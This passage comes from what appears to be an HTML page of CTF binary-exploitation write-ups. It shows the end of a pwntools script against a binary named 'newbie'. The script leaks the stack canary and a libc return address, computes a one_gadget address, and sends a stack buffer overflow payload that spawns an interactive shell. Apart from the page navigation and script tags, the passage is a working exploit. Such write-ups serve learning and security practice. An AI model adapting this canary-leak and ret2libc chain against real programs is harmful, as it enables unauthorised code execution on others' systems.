    libc_path = &quot;./libc-2.27.so&quot;
    magic_offset = next(generate_one_gadget(libc_path))
    log.info(f&quot;Found magic one gadget at offset: {hex(magic_offset)}&quot;)

    # Get the __libc_start_main offset
    libc_elf = ELF(libc_path)
    __libc_start_main_offset = libc_elf.libc_start_main_return
    log.info(f&quot;__libc_start_main_offset {hex(__libc_start_main_offset)}&quot;)

    # start the program
    p = process(&quot;./newbie&quot;)

    # Leak the canary
    canary = 0
    for i in range(4): # Canary is 8 bytes, but we read only 2 of em each time, so we loop 4 time and do some bit shifting arithmetic
        canary += (leak(p, stack_canary_offset+i)) &lt;&lt; (16 * i) # 16 * 4 = 64 bits (8 bytes).
    log.info(f&quot;Leaked Canary {hex(canary)}&quot;)

    # leak the libc start main return value
    __libc_start_main = 0
    for i in range(4):
        __libc_start_main += (leak(p, stack___libc_start_main_offset + i)) &lt;&lt; (16 * i) # 2 bytes at (stack__libc_start_main_offset + i)
    log.info(f&quot;Leaked __libc_start_main: {hex(__libc_start_main)}&quot;)
    # Get the libc base offset
    libc_base = __libc_start_main - __libc_start_main_offset
    log.info(f&quot;libc base address {hex(libc_base)}&quot;)
    # Calculate magic offset address using libc base
    magic = libc_base + magic_offset
    log.info(f&quot;Magic one gadget address : {hex(magic)}&quot;)

    # Trigger Buffer Overflow
    p.recvuntil(b&quot;&gt; &quot;)
    payload = b&quot;A&quot; * 88 + p64(canary) + p64(0x4242424242424242) + p64(magic)
    p.sendline(payload)
    # Quit to return
    p.recvuntil(b&quot;&gt; &quot;)
    p.sendline(b&quot;quit&quot;)
    log.success(&quot;Shell spawned! Enjoy !&quot;)

    p.interactive()

if __name__ == &quot;__main__&quot;:
    main()
</code></pre>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="pwnkit.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>
                            <a rel="next" href="hackthebox-pwn-snowy.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>
                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="pwnkit.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>
                    <a rel="next" href="hackthebox-pwn-snowy.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>

        <script type="text/javascript">
            window.playground_copyable = true;
        </script>
        <script src="elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="mark.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="searcher.js" type="text/javascript" charset="utf-8"></script>
        <script src="clipboard.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="highlight.js" type="text/javascript" charset="utf-8"></script>
        <script src="book.js" type="text/javascript" charset="utf-8"></script>

        <!-- Custom JS scripts -->
    </body>
</html>
